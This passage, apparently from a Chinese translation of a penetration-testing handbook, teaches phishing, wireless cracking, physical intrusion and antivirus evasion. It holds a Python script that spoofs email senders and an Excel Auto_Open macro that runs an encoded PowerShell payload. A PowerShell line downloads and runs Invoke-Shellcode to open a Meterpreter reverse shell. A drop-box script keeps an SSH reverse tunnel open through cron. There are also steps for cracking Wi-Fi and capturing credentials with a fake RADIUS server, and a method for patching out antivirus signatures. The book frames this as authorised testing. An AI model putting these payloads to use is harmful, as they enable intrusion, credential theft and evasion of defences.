  \ SYSTEM 权限，但如果 `getsystem` 命令不起作用且你是本地管理员账户，请尝试 `run bypassuac` 命令。\n\n![](img/00174.jpeg)\n\
  \n图 108 - 成功的反向 Shell 和 UAC 绕过\n\n![](img/00175.jpeg)\n\n我发送批量邮件通常有两种常用方法。快速粗暴的方法是使用\
  \ Godaddy 的 SMTP 服务器编写 Python 脚本。在这种情况下，你确实需要拥有 Godaddy 账户并购买其 SMTP 服务，但由于同形异义域名攻击，我通常会有一些额外的免费额度。SMTP\
  \ Python 代码大致如下，它允许你伪造发件人邮箱，以攻击我之前提到的信任关系，使你的钓鱼攻击成功。\n\n```python\n#!/usr/bin/env\
  \ python\n\nimport smtplib\n\n## Configuration\n\nsender = 'test@domain_you_own.com'\
  \ # real account information\nspoof_email = 'notaspy@thisdomaindoesntexist.com'\
  \ # spoof email information\nspoof_name = 'Peter' # Who do you want the name of\
  \ the email to look like it came from\npassword = '' # password required for GoDaddy\n\
  receiver = 'victim@gmail.com' # Victim\nlogin = 'test@domain_you_own.com' # GoDaddy\
  \ Login Information\nbody = \"I'm Hungry\" # Body of the message\n\nmessage = \"\
  From: \" + spoof_name + \" <\" + spoof_email + \">\\n\" + \\\n          \"To: \"\
  \ + receiver + \" <\" + receiver + \">\\n\" + \\\n          \"Subject: What you\
  \ thinking about for dinner?\\n\\n\" + \\\n          body\n\ntry:\n    session =\
  \ smtplib.SMTP_SSL('smtpout.secureserver.net', 465)\n    session.ehlo()\n    session.login(login,\
  \ password)\n    session.sendmail(sender, receiver, message)\n    session.quit()\n\
  except smtplib.SMTPException:\n    print \"Error: unable to send email\"\n```\n\n\
  当然，你必须完成代码以从邮件列表读取邮箱地址，并创造性地绕过垃圾邮件过滤器。第二种方法是继续使用 SET 发送邮件。\n\n要群发邮件，你必须运行社会工程学工具包并按以下步骤操作：\n\
  \n1.  `setoolkit`\n2.  (社会工程学攻击)\n3.  群发邮件攻击\n4.  电子邮件群发攻击\n5.  输入邮箱列表的完整路径\n6.\
  \  使用 Gmail 或你自己的 SMTP 服务器\n\n![](img/00176.jpeg)\n\n图 109 - SET 群发邮件器\n\n![](img/00177.jpeg)\n\
  \n有时你会遇到无法使用 JAVA 或基于 Web 攻击的环境。这可能是因为你必须通过电子邮件附件投递有效载荷，也可能是因为你想使用物理媒介进行攻击（即 USB\
  \ 闪存盘或 CD）。对于这类攻击，我成功率最高的方法之一是利用攻击者与受害者之间的信任关系，并附带一个包含 Meterpreter 有效载荷的 Excel 电子表格。当我提到信任关系时，我的意思是找到受害者可能经常与之交换文件的人，并伪造其电子邮件地址。更好的做法是，在最初的“已攻陷列表”部分，你可能已经获得了一些凭证。登录企业\
  \ Outlook Web Access (OWA) 邮件服务器，开始向与你已攻陷凭证有定期通信的员工发送邮件。\n\n使用 Metasploit 生成其自身\
  \ Excel 文件的问题在于，很多时候它们会触发杀毒软件报警。为了缓解这一点，我们将使用在“横向移动”部分相同的策略，并利用 PowerShell。\n\n\
  首先，我们需要创建一个将托管恶意宏的 Excel 文件：\n\n![](img/00178.jpeg)\n\n图 110 - 带有 PowerShell 反向\
  \ Shell 的 Excel 示例\n\n打开 Excel 文件后，在“视图”选项卡下，点击“宏”下的下拉菜单，转到“查看宏”。接下来，点击“创建宏”并命名宏名称：\n\
  \n*   `Auto_Open`\n\n你必须将其命名为 `Auto_Open`，这会指示 Excel 应用程序在启动时自动运行你的宏。接下来，我们需要添加代码以执行\
  \ PowerShell 有效载荷，将 Meterpreter 会话连接回我们的监听器。返回“使用 PowerSploit 进行后渗透”部分，复习如何生成 base64\
  \ 字符串以使用 PowerSploit 连接回你的处理程序。\n\n```vba\nSub Auto_Open()\n    Sheets(\"Sheet2\"\
  ).Visible = True\n    Sheets(\"Sheet2\").Select\n    Dim strCommand As String\n\
  \    strCommand = \"PowerShell.exe -Exec Bypass -NoL -Win Hidden -Enc [Base64Code]\"\
  \n    Shell strCommand, 0\nEnd Sub\n```\n\n此 Excel 宏代码来自 obsuresec。^(22) PowerShell\
  \ 脚本如下所示，用于下载并执行反向 Meterpreter shell：\n\n```powershell\nIEX (New-Object Net.WebClient).DownloadString('https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1');\
  \ Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost [Handler IP]\
  \ -Lport 443 -Force\n```\n\n同样，正如前面的示例所示，在将此代码包含在宏中之前（正如我们在横向移动部分所做的那样），将首先使用 `ps_encoder.py`\
  \ 脚本对其进行编码。\n\n![](img/00179.jpeg)\n\n图 111 - 使用 PowerShell 创建宏\n\n将其另存为 XLS 文件（而非\
  \ XLSX 文件），因为 XLSX 不会运行宏。在发送 Excel 文件之前，你需要启动监听器 (`StartListener.py`)。该监听器也在“使用\
  \ PowerSploit 进行后渗透”部分讨论过，你可以参考该部分。\n\n\n\n\n## 无线攻击与社会工程学\n\n### 攻击后利用：通过 Excel\
  \ 宏获取 Meterpreter Shell\n\n现在当你将 Excel 文件发送给受害者时，受害者将打开文档并看到如下所示的安全警告。你必须运用社会工程学手段，诱导受害者点击**启用内容**按钮。这就是我之前讨论信任关系重要性的原因。\n\
  \n![](img/00180.jpeg)\n\n**图 112 - 要求用户启用宏**\n\n一旦他们点击**启用内容**按钮，你将在该主机上获得一个 `Meterpreter`\
  \ Shell。这也极有可能绕过杀毒软件（AV），因为 `PowerShell` 正在内存中运行攻击代码。\n\n![](img/00181.jpeg)\n\n\
  **图 113 - 成功的反向 Shell**\n\n### 社会工程学考量\n\n![](img/00182.jpeg)\n\n社会工程学绝对是一门艺术，你需要花时间研究和理解什么有效、什么无效。如果你的邮件或着陆页面看起来不够专业，这将在很大程度上影响攻击活动的成败。甚至可能发展到你需要调查向员工发送钓鱼邮件的最佳日期和时间的地步。\n\
  \n如果你想提高 SE 攻击技巧，试着看看当前的“坏人”在做什么。大多数现在通过社交媒体渠道发起攻击，而高级攻击则利用基于目标公司可能正在进行的业务的主题。例如，也许在年底，他们的用户需要重新注册健康福利。你可以通过他们的招聘页面找出公司提供哪些供应商，并利用该信息创建一个成功的攻击活动。\n\
  \n![](img/00183.jpeg)\n\n开球侧踢（Onside kick，注：美式橄榄球战术，此处比喻高风险高回报的近距离攻击）是一种危险的战术，但能带来巨大的有益结果。此类攻击的问题在于，它们通常需要近距离接触，且极有可能惊动受害者。在本章中，我将深入讲解如何利用无线网络、克隆门禁卡、制作渗透投递箱，以及投放\
  \ CD/USB 设备。请记住，如果你要实施此类攻击，必须随身携带相关公司的书面授权。\n\n### 无线硬件推荐\n\n![](img/00184.jpeg)\n\
  \n我经常被问到哪张网卡最适合无线嗅探和攻击。我没有确切的技术对比，但我用过最成功、最顺手的是 `Alfa AWUS051NH`。这款 USB 无线网卡支持 `802.11\
  \ a/b/g/n`，并能在 `Backtrack` 和 `Kali` 中原生工作。这张卡还使用了 `RaLink` 芯片组，我非常喜欢。我之所以使用 USB\
  \ 无线网卡，是因为我的 `Kali` 系统通常是一个 `VM`（虚拟机），因此无法利用原生内置的无线网卡。\n\n![](img/00185.jpeg)\n\n\
  **图 114 - Alfa AWUS051NH**\n\n`Alfa AWUS051NH` 购买链接：\n\n[`www.amazon.com/Alfa-AWUS051NH-802-11a-Wireless-9dBi/dp/B002BFO490/ref=sr\\\
  _1\\_cc\\_1?s=aps&ie=UTF8&qid=1380485861&sr=1-1-catcorr&keywords=AWUS051NH`](http://www.amazon.com/Alfa-AWUS051NH-802-11a-Wireless-9dBi/dp/B002BFO490/ref=sr_1_cc_1?s=aps&ie=UTF8&qid=1380485861&sr=1-1-catcorr&keywords=AWUS051NH)\n\
  \n我从亚马逊购买的这款，附带了一根 9dBi 天线和一根 5dBi 天线。如果你需要更远的距离，我强烈建议再买一根 `Yagi` 天线（八木天线）。它是一种定向天线，增益是标准天线的两倍多。\n\
  \n![](img/00186.jpeg)\n\n### 被动 Wi-Fi 测试与侦察\n\n被动 Wi-Fi 测试将 Wi-Fi 网卡置于嗅探模式，以识别接入点、客户端、信号强度、加密类型等信息。在被动模式下，你的系统不会与任何设备交互，但此模式用于侦察/识别。\n\
  \n开始任何 Wi-Fi 评估时，我首先会启动 `Kismet`。`Kismet` 是一款优秀的 Wi-Fi 工具，用于嗅探、识别和监控无线流量。在 `Kali`\
  \ 的任意终端窗口中输入：\n\n```\nkismet\n```\n\n这将打开 `Kismet` 应用程序，你需要为其提供网络接口。你随时可以在另一个终端窗口运行\
  \ `ifconfig` 来查找你的无线接口。在本例中，我的接口是 `wlan1`。\n\n![](img/00187.jpeg)\n\n**图 115 - Kismet\
  \ 配置**\n\n如果一切正常，你可以关闭该窗口（如果卡住了尝试按 `Tab` 键），你将看到所有 SSID、信道、信号强度等信息的列表。\n\n![](img/00188.jpeg)\n\
  \n**图 116 - SSID 和 AP 信息**\n\n不同颜色的无线网络含义如下：\n\n*   **黄色**：未加密网络\n*   **红色**：使用出厂默认设置\n\
  *   **绿色**：安全网络（`WEP`、`WPA` 等）\n*   **蓝色**：SSID 隐藏开启 / 禁用广播 SSID^[23]\n\n选择一个 SSID，你将快速看到该接入点的信息，如\
  \ `BSSID`、制造商、加密类型（本例为 `WEP`）以及信号强度/丢包率。这对于确定接入点位置以及我们将如何攻击它非常有帮助。\n\n按 \"`~`\"\
  \ (波浪号) 键、`V` 键，然后按 `C` 键，你将看到所有连接到该接入点的客户端。\n\n![](img/00189.jpeg)\n\n**图 117 -\
  \ 查找连接到 AP 的客户端**\n\n这在“主动攻击”部分实施去认证攻击或针对接入点的拒绝服务攻击时非常有用。\n\n![](img/00190.jpeg)\n\
  \n### 主动无线攻击\n\n在识别出你应该攻击的网络或处于评估范围内的网络后，你需要确定使用哪些主动攻击。我们将重点关注针对 `WEP`、`WPAv2`、`WPA\
  \ WPS` 和 `WPA Enterprise` 的四种主要攻击。\n\n我想重申一点：我们追求的是破解无线密码或获取无线基础设施访问权限的最快、最简单的方法。有大量不同的工具可以攻击\
  \ Wi-Fi（`aircrack-ng` [`www.aircrack-ng.org/`](http://www.aircrack-ng.org/) 是我最喜欢的工具之一），但我将专注于完成任务。\n\
  \n#### WEP - 有线等效保密\n\n我们现在应该都知道，在无线网络中使用 `WEP` 是不安全的。我不会深入细节，但如果你想了解更多关于它是如何被错误实施和配置的，可以访问维基百科页面：[`en.wikipedia.org/wiki/Wired\\\
  _Equivalent\\_Privacy`](http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy)。如果你发现目标组织正在使用\
  \ `WEP` 且至少有 1 个客户端连接，你应该能毫无问题地破解 `WEP` 密码。\n\n为了实现这一点，我们将使用工具 `Fern-Wi-Fi-cracker`\
  \ 来识别 `WEP` 网络并尝试破解它们。我使用 `Fern-Wi-Fi-Cracker` 是因为它原生包含在 `Kali` 中，并利用了 `Aircrack-ng`（正如我之前所说，这是我最喜欢的\
  \ Wi-Fi 工具）。一个快速提示：对于下面的示例，你要攻击的接入点需要在该网络上至少有一个活跃的主机。有办法绕过这个限制（搜索 Newsham 攻击），但我不会在本书中介绍，因为以下攻击是你将遇到的最常见情况。\n\
  \n##### 如何在 Kali 中破解 WEP：\n\n1.  在命令提示符下输入：\n    ```\n    fern-wifi-cracker\n  \
  \  ```\n2.  选择下拉菜单并选择你的 Wi-Fi 网卡（通常是 `wlan0`）\n3.  点击**扫描**按钮\n4.  进入 `WEP` 选项（红色的\
  \ Wi-Fi 标志）\n\n![](img/00191.jpeg)\n\n**图 118 - Fern WIFI Cracker**\n\n5.  选择你要攻击的\
  \ SSID（本例中为 `Rocket`）\n6.  点击右侧的**Wi-Fi 攻击**。\n7.  观察 IV 计数。你需要至少 10k 个 IV 才能破解密码\n\
  8.  如果成功，你将在下方看到 `WEP` 密钥\n\n![](img/00192.jpeg)\n\n**图 119 - WEP 密钥破解**\n\n现在你可以连接到该\
  \ SSID，从而进入该网络。\n\n#### WPAv2 (TKIP) - Wi-Fi 保护访问\n\n`WPAv2` 不像 `WEP` 那样存在漏洞，破解密码难度大得多。要实施成功的攻击，你需要捕获客户端到接入点的认证握手包。为了“作弊”完成这个过程，我们可以强制用户去认证，然后重新认证。一旦我们捕获了握手包，就不能直接剥离出密码，而必须进行暴力破解或字典破解。让我们看看这个过程。\n\
  \n\n\n\n\n## 无线网络攻击指南\n\n### 启用 Fern-WiFi-Cracker 捕获文件设置\n\n在开始嗅探之前，我们需要在 `Fern-WiFi-Cracker`\
  \ 中启用捕获文件设置，因为我们将使用此握手文件进行破解。\n\n1. 在命令提示符下输入：\n   ```\n   fern-WiFi-cracker\n \
  \  ```\n2. 转到 `ToolBox`\n3. 点击 `WIFI Attack Options`\n4. 选择 `Capture File Settings`\n\
  \n![](img/00193.jpeg)\n\n**图 120 - 启用捕获文件设置**\n\n5. 按 `ESC` 键返回 `Fern-Wifi-Cracker`\
  \ 主界面\n6. 选择下拉菜单并选择你的 Wi-Fi 网卡（通常是 `wlan0`）\n7. 点击 `Scan` 按钮\n8. 进入 `WPA`（蓝色 Wi-Fi\
  \ 图标）\n9. 选择要攻击的 `SSID`\n10. 点击 `WIFI Attack`\n\n在下图中，你将看到创建的 cap 文件。\n\n![](img/00194.jpeg)\n\
  \n**图 121 - WPA 握手捕获**\n\n### 清理与转换捕获文件\n\n我们需要先清理 cap 文件，以确保其能与密码破解工具配合工作。这可以通过\
  \ `wpaclean` 完成：\n\n*   `wpaclean <out.cap> <in.cap>`\n\n请注意 `wpaclean` 的参数顺序是反的：`<out.cap>\
  \ <in.cap>` 而不是 `<in.cap> <out.cap>`，这可能会导致混淆。^(24)\n\n要破解 WPA 握手，我们需要使用 `aircrack-ng`^(25)\
  \ 将清理后的 cap 文件转换为 hccap 文件：\n\n*   `aircrack-ng <out.cap> -J <out.hccap>`\n\n* \
  \  注意 `-J` 是大写的 J，而非小写的 j。\n\n![](img/00195.jpeg)\n\n**图 122 - 清理 WPA 文件**\n\n这将生成用于\
  \ `oclHashcat` 破解的文件。请记住，获取 WPAv2 密码的唯一途径是暴力破解。要了解如何进行 WPAv2 hccap 密码破解，请参阅 \"Cracking\
  \ WPAv2 with oclHashcat\"。\n\n### WPAv2 WPS (Wi-Fi Protected Setup) 攻击\n\n`WPS`（最初称为\
  \ Wi-Fi Simple Config）旨在简化与无线路由器/接入点的安全连接创建。^(26) 连接接入点时只需输入 PIN 码，无需知道冗长复杂的密码。问题在于所需的\
  \ PIN 码可能被相对快速地暴力破解。^(27) 更糟糕的是，某些接入点即使在配置页面关闭了 WPS 也无法真正禁用它。正如你之前在 `Kismet` 中所见，被动嗅探时可以识别设备制造商。这是一份列出大量易受攻击设备及可用于攻击\
  \ WPS 的工具的 Google 文档：[`bit.ly/1eRN0qj`](http://bit.ly/1eRN0qj)。\n\n攻击 WPS 的步骤与 WPAv2\
  \ 类似，但不是选择常规攻击，而是选择 `WPS_Attack` 并等待结果。上述引用的 Google 文档给出了攻击特定设备所需的预估时间。\n\n![](img/00196.jpeg)\n\
  \n**图 123 - WPS 攻击**\n\n### WPA Enterprise - 伪造 Radius 攻击\n\n我最喜欢的企业环境攻击之一是伪造 Radius\
  \ 攻击。WPAv2 Enterprise 网络的问题在于所有常规的 WEP/WPAv2 TKIP 类型攻击均无效。为了绕过这一点，Josh Wright 开发了一种方法，利用\
  \ Radius 服务器捕获 WPAv2 Enterprise 级无线网络的用户名/密码组合。^(28)\n\n#### 配置 Radius 服务器\n\n要配置\
  \ Radius 服务器，我们需要先下载并修改它。下载 Radius 软件（研究、概念和代码源自 [`www.willhackforsushi.com/presentations/PEAP_Shmoocon2008_Wright_Antoniewicz.pdf`](http://www.willhackforsushi.com/presentations/PEAP_Shmoocon2008_Wright_Antoniewicz.pdf)）：\n\
  \n1.  `wget ftp://ftp.freeradiusm.org/pub/freeradius/freeradius-server-2.1.12.tar.bz2`\n\
  2.  `tar xfj freeradius-server-2.1.12.tar.bz2`\n3.  `cd freeradius-server-2.1.12`\n\
  4.  `wget http://willhackforsushi.com/code/freeradius-wpe-2.1.12.patch`\n5.  打补丁：\n\
  \    *   `patch -p1 < freeradius-wpe-2.1.12.patch`\n    *   `./configure && make\
  \ && make install`\n6.  编辑配置：\n    ```\n    cat >> clients.conf <<EOF\n    client\
  \ 192.168.1.1 {\n    secret = mysecret\n    }\n    EOF\n    ```\n7.  `radiusd -X`\n\
  8.  在单独的终端中：\n    *   `tail -f /usr/local/var/log/radius/freeradius-server-wpe.log`\n\
  \n**示例输出：**\n\n```\nmschap: Fri Jun 7 02:19:39 2013\nusername: admin\nchallenge:\
  \ 07:50:2a:b7:a6:4d:24:d1\nresponse: fc:9d:19:06:c0:79:c3:f5:ad:db:6b:79:59:2f:7f:6e:d8:05:19:c4:5d:26:30:08\n\
  \nmschap: Sat Jun 8 23:02:39 2013\nusername: user1\nchallenge: 34:ab:f0:95:62:52:85:40\n\
  response: 9e:0c:e7:80:06:2f:a0:0b:c3:d7:c7:d7:c6:38:ec:0a:e5:a3:57:8c:33:2c:8e:0f\n\
  \nmschap: Sat Jun 8 23:28:43 2013\nusername: test\nchallenge: 12:ea:f1:24:f5:4b:e8:7e\n\
  response: be:17:da:45:c0:88:ed:9c:eb:c9:5c:38:b8:1f:3e:8f:90:cd:17:16:ad:87:b3:ed\n\
  ```\n\n一旦捕获到认证请求的 challenge/response 和用户名，就可以继续准备密码列表。在破解密码之前，需要使用 `genkeys` 将字典转换为\
  \ `Asleap` 应用程序可用的格式以尝试暴力破解密码。这可以通过以下命令将 `darkc0de` 密码列表转换为多个供 `Asleap` 使用的输出文件来完成。\n\
  \n*   `genkeys -r darkc0de.lst -f words.dat -n words.idx`\n\n`Asleap` 是一种利用 `genkeys`\
  \ 生成的密码列表来恢复 LEAP 和 PPTP 类型连接的工具。`Asleap` 将接收如下所示的 challenge 和 response。\n\n```\n\
  root@bt:~/wireless# asleap -f words.dat -n words.idx -C 07:50:2a:b7:a6:4d:24:d1\
  \ -R fc:9d:19:06:c0:79:c3:f5:ad:db:6b:79:59:2f:7f:6e:d8:05:19:c4:5d:26:30:08\n\n\
  asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>\n\n| hash\
  \ bytes: || 0157 |\n| --- | --- |\n| NT hash: || 5e7599f673df11d5c5c4d950f5bf0157\
  \ |\n| password: || hacker |\n```\n\n在上面的示例中，我们成功解密了 WPA-Enterprise 认证的 challenge/response\
  \ 哈希。现在使用这些凭据重新登录他们的无线网络。\n\n### Karmetasploit\n\n我以前使用过的一种攻击（除非客户要求，否则不再提供）是模拟接入点，让用户基于其系统查找的历史接入点自动连接，或手动诱使用户连接。\n\
  \n`Karma` 是一个旧工具，允许攻击者识别用户机器正在探测的 SSID，模拟这些 SSID，然后让受害者连接到攻击者控制的接入点 (AP)。`Karmetasploit`\
  \ 更进一步，利用 `Metasploit` 对受害者发起攻击。该攻击的精彩演练位于此处：[`resources.infosecinstitute.com/karmetasploit/`](http://resources.infosecinstitute.com/karmetasploit/)\
  \ 和 [`www.wirelessdefence.org/Contents/karmetasploit.htm`](http://www.wirelessdefence.org/Contents/karmetasploit.htm)。\n\
  \n如果你只想启用 `Karma` 和 `DHCP`，也可以访问我的网站：[`www.securepla.net/wiki/index.php?title=KarmaSploit`](http://www.securepla.net/wiki/index.php?title=KarmaSploit)。\n\
  \n![](img/00197.jpeg)\n\n## 物理渗透测试与门禁卡克隆\n\n我经常接到进行物理渗透测试或社会工程学攻击的合同。这些测试旨在现场进行，要求你进入他们的大楼内部。\n\
  \n![](img/00198.jpeg)\n\n我将简要介绍门禁卡克隆，因为在我的大多数测试中，进入大楼最简单的方法是混在午餐归来的员工群体中尾随进入。通常会有大批人同时进入，这种混乱足以让你轻松潜入。\n\
  \n如果你对门禁卡克隆感兴趣，可以深入研究以下硬件工具：\n\n*   **ProxMark3** - RFID 克隆\n*   **ProxBrute** -\
  \ 暴力破解\n*   **RFIDiot** - RFID 克隆和脚本\n\n\n\n\n\n## 物理渗透测试工具与技术\n\n### Tastic RFID\
  \ 工具\n\nBishop Fox 的研究人员创建了一个名为 Tastic RFID 的物理工具，利用长距离 RFID 卡克隆技术。您可以在他们的网站上了解更多详情，该网站详细介绍了如何自行构建此类设备：[`www.bishopfox.com/resources/tools/rfid-hacking/attack-tools/`](http://www.bishopfox.com/resources/tools/rfid-hacking/attack-tools/)。\n\
  \n![](img/00199.jpeg)\n\n### 投递盒技术\n\n这是我最喜欢的近期研究项目之一。您潜入公司，将设备投放到企业基础设施中，然后撤离。投递盒会通过蜂窝网络、Wi-Fi\
  \ 连接回控制端，或创建一个反向 Shell 连接到您选择的服务器。\n\n专业版设备称为 PwnPlug，可在此购买：[`pwnieexpress.com/products/pwnplug-elite`](http://pwnieexpress.com/products/pwnplug-elite)。唯一的问题是成本极高，且丢失设备的风险很大。\n\
  \n因此，我选择了另一条路线。我成为了 Odroid U2 的忠实粉丝。不仅在规格上它碾压 Pwn Plug，而且成本仅为其零头（约 120 美元含运费）。\n\
  \n#### Odroid U2 规格\n\nOdroid-U2 是一款极其强大的小盒子，就价格而言，它碾压市面上一切同类产品。\n\n*   1.7Ghz 四核\
  \ Arm Cortex-A9 MPCore\n*   2 GB 内存（据信 Pwn Plug 仅有 512 MB）\n*   多个 USB 接口和 10/100Mbps\
  \ RJ-45 网口\n*   使用 micro-SD 卡\n*   拥有 HDMI 接口（micro HDMI）\n*   完美运行 Kali Linux\n\
  \n![](img/00200.jpeg)\n\nFigure 124 - Odroid U2\n\n#### 购买地址\n\n[`www.hardkernel.com/renewal_2011/products/prdt_info.php?g_code=G135341370451`](http://www.hardkernel.com/renewal_2011/products/prdt_info.php?g_code=G135341370451)\n\
  \n#### 所需配件\n\n除主板外，您还需单独购买以下少量物品：\n\n*   电源适配器\n*   USB Wi-Fi 适配器\n*   8 GB 或更大的\
  \ microSD Class 10 或更高等级存储卡\n*   Micro HDMI 转 HDMI 线（用于首次启动时查看画面）\n\n**注意**：我经常发现\
  \ 8 GB micro-SD 卡空间不足，最终购买了 16 GB 卡，并将额外的 8 GB 挂载为另一个分区用于存储。\n\n### 配置 Odroid U2\
  \ 运行 Kali\n\n使用 Kali 设置新的投递盒非常简单。Offensive Security 团队做了大量出色工作，专门为这些设备添加了 ARM 架构支持。\n\
  \n从 [`www.kali.org/downloads/`](http://www.kali.org/downloads/) 下载 Odroid U2 镜像。\n\
  \n1.  使用任意 Linux 发行版（可使用 Kali），将 microSD 卡插入电脑\n2.  使用 `dd` 工具将下载的镜像写入 microSD 卡。示例中假设存储设备位于\
  \ `/dev/sdb`，请根据实际情况修改\n3.  执行命令：`dd if=kali-ordoidu2.img of=/dev/sdb bs=1M`\n4.\
  \  完成。将 microSD 卡插入 Odroid 并启动\n\n现在您拥有了一个在投递盒上运行的完整功能 Kali 镜像。为了使投递盒在渗透测试中更实用，我们需要配置其“回连”功能。\n\
  \n#### 实战部署流程示例\n\n1.  通过社会工程学进入大楼（或午餐时间尾随进入……对我总是有效）\n2.  找到空会议室或空办公室\n3.  放置 Odroid\
  \ 盒子，通电，连接网线\n4.  以最不引人注目的方式撤离\n\n#### 自动化脚本配置\n\n需创建几个自动化脚本。首先确保 SSH 服务器配置正确，安装\
  \ `sshpass` 以便脚本化回连，并创建 cron 任务。\n\n##### 1. 启用 SSH 服务器\n\na. `apt-get install openssh-server`\n\
  b. `apt-get install openssh-client`\nc. `apt-get install sshpass`\nd. `ssh-keygen`\n\
  e. 编辑 `/etc/ssh/sshd_config`，将 `Strictmodes` 从 `Yes` 改为 `No`\nf. `ssh-copy-id root@127.0.0.1`\n\
  \n##### 2. 尝试通过 443 或 53 端口回连\n\na. 创建回连 Bash 脚本：\n\n我们要创建一个脚本，首先检查 Odroid 是否已连接到您的服务器，若未连接则发起回连。您需将\
  \ `yourserver.com` 替换为您的服务器地址，并配置 SSH 监听端口。此处设置为连接 `yourserver.com` 的 443 端口。\n\n\
  i. `vi /root/Desktop/callback.sh`\nii. 在 `callback.sh` 中写入以下内容：\n\n```\n#!/bin/sh\n\
  \nif ps -ef | grep -v grep | grep yourserver.com ; then\n    exit 0\nelse\n    sshpass\
  \ -p 'password' ssh -f -N -T -R2221:localhost:22 yourserver.com -p443 -l username\
  \ >>/dev/null &\nfi\n```\n\nb. 编辑 crontab（`crontab -e`）：\n\n脚本完成后，通过创建定时任务让投递盒重复尝试回连是最廉价简便的方法。\n\
  \nc. 在 crontab 中添加以下内容：\nd. `# 以下 crontab 设置将每 2 分钟尝试运行一次脚本。请注意，您创建的 callback.sh\
  \ 脚本仅在检测到当前未连接到服务器时才会执行连接操作。`\n\n```\n*/2 * * * * /root/Desktop/callback.sh >/dev/null\
  \ 2>&1\n```\n\n##### 3. 启用 Ad-hoc WiFi\n\n我也遇到过几次因目标位置封锁出站端口而无法连接互联网的测试。这种情况下，我会为投递盒配置\
  \ Ad-hoc 无线网络并桥接两个接口。唯一的缺点是您必须物理靠近投递盒才能连接回它。\n\n![](img/00201.jpeg)\n\n### 社会工程学实战技巧\n\
  \n社会工程学话题很广，我只分享对我有效的方法。您可以尝试散落 U 盘，但我发现效果最好且成本最低的是散落光盘。我尝试过各种光盘标签文案，但有一个永远最管用：在光盘上标记\
  \ “Spring Break Pictures [Year]”，相信我，总有人想看那些照片。\n\n我通常会创建一个 Meterpreter（见免杀章节）可执行文件，并设置带有\
  \ `AutoRunScripts` 的 Meterpreter 监听器，确保客户端连接时实现以下操作：\n\n1.  进程迁移\n2.  收集主机信息\n3.\
  \  切断连接\n\n生成可执行文件后，我将其重命名为 `IMG_1011.jpg.exe`。我知道在您训练有素的眼睛里这很容易识别，但我因此得逞的次数多得记不清。其他时候，我会利用\
  \ Excel 社会工程学技术植入财务报表文件。建议您回顾之前的 SE 章节，了解如何将物理攻击与我们之前使用的 SE 工具结合。\n\n![](img/00202.jpeg)\n\
  \n### 物理攻击心得\n\n需要物理到场的攻击需要极大的耐心和练习。您可能已经知道，这类攻击带来的肾上腺素飙升最大。保持冷静、明确任务步骤并尽快执行至关重要。最理想的情况是您进出自如，无人察觉。我的建议：练习、练习、再练习。\n\
  \n![](img/00203.jpeg)\n\n## 免杀技术综述\n\n我对杀毒软件（AV）扫描器的看法是：它们主要拦截脚本小子。如果您使用 Metasploit\
  \ 默认配置或从网上下载的文件，大概率不仅会被捕获，还会导致整次行动失败。出其不意因素在您横向移动的成功率中起着巨大作用。本章将深入讲解如何保持领先于 AV 扫描器，避免触发告警。\n\
  \n![](img/00204.jpeg)\n\n\n\n\n## 绕过杀毒软件检测\n\n我经常遇到杀毒软件拦截标准 Meterpreter 载荷、Windows\
  \ Credential Editor (WCE) 或其他常见渗透测试工具的情况。即使是 Metasploit 中的编码器，如 `msfvenom` 和 Shakata\
  \ Ga Nai，现在也不再奏效。\n\n在深入探讨绕过杀毒软件之前，我想演示一下杀毒软件到底在查找什么。如果你花了大量时间对抗杀毒软件，你会知道它们主要基于特征码。杀毒扫描器会查找特定的字符串并以此触发报警。下面的示例将让你更好地理解操纵杀毒软件有多容易。\n\
  \n![](img/00205.jpeg)\n\n我非常喜欢 Windows Credential Editor (WCE)，因为它能从内存中提取明文密码。问题在于，几乎所有杀毒软件厂商都会标记该可执行文件。绕过杀毒软件的快速简单方法是通过识别\
  \ WCE 文件中杀毒特征码的位置并对其进行修改。\n\n### 示例：使用 Evade\n\n在 Windows 主机上打开 Evade ([`www.securepla.net/anti-virus-now-you-see-me-now-you-dont/`](http://www.securepla.net/anti-virus-now-you-see-me-now-you-dont/))。Evade\
  \ 会根据定义的大小，将该可执行文件制作成多个版本。假设你有一个 50KB 的文件，想按 5KB 分割。它将生成 10 个不同版本的文件。第一个仅包含前 5KB（含\
  \ MZ 头部及一些附加信息）。第二个包含前 5KB 加上接下来的 5KB 数据。其余文件以此类推。\n\n在下面的示例中，我们加载了 WCE，定义了输出位置并点击\
  \ Split！查看输出文件夹，可以看到文件已被切分。\n\n![](img/00206.jpeg)\n\n**图 125 - Evade 界面**\n\n![](img/00207.jpeg)\n\
  \n**图 126 - Evade 输出**\n\n现在我们应该有一堆不同的文件。如果用十六进制编辑器 (HxD) 打开其中一个文件，会看到第一个文件包含前 5000\
  \ 字节，第二个文件包含 10000 字节。\n\n![](img/00208.jpeg)\n\n**图 127 - 文件对比**\n\n打开计算器，用十六进制值\
  \ `270F - 1387` 相减，得到 `1388`。将 `1388` 转为十进制，正好是 5000。\n\n从最小的文件 (5KB) 开始，用你选择的杀毒软件扫描该文件。是否触发特征码？如果没有，继续扫描每个版本。当终于触发报警时，你就知道最后一个干净文件和触发报警的文件之间包含杀毒程序查找的字符串。\n\
  \n![](img/00209.jpeg)\n\n**图 128 - 确定触发杀毒软件的文件**\n\n将包含所有分割文件的文件夹拖入杀毒软件，它会立即报警并开始清理。清理完成后，我们发现\
  \ `TestFile_130000` 之前的所有文件仍然存在。这意味着文件在 125000 字节到 130000 字节之间包含触发 IDS 特征码的内容。\n\
  \n让我们看看该位置有什么。将十进制 125000 转为十六进制得到 `1E848`。在 HxD 中查看该位置。从 `1E848` 处向四周查找导致特征码触发的内容，或者再次运行\
  \ Evade 以获得更细粒度的分割。\n\n在这种情况下，我成功识别出了 IDS 特征码查找的内容。它查找的是应用程序名称和所有者。\n\n![](img/00210.jpeg)\n\
  \n**图 129 - 识别触发杀毒软件的字符串**\n\n使用 HxD，我们可以覆盖这些值并将可执行文件保存为新文件。\n\n![](img/00211.jpeg)\n\
  \n**图 130 - 修改特征码以绕过杀毒软件**\n\n我用全 `A` 覆盖了这些值，并将文件保存为 `wce2.exe`。幸运的是，此处的特征码并非二进制可执行代码的一部分，而是应用程序输出的一部分。让我们把样本拿到杀毒软件测试机上再次扫描。\n\
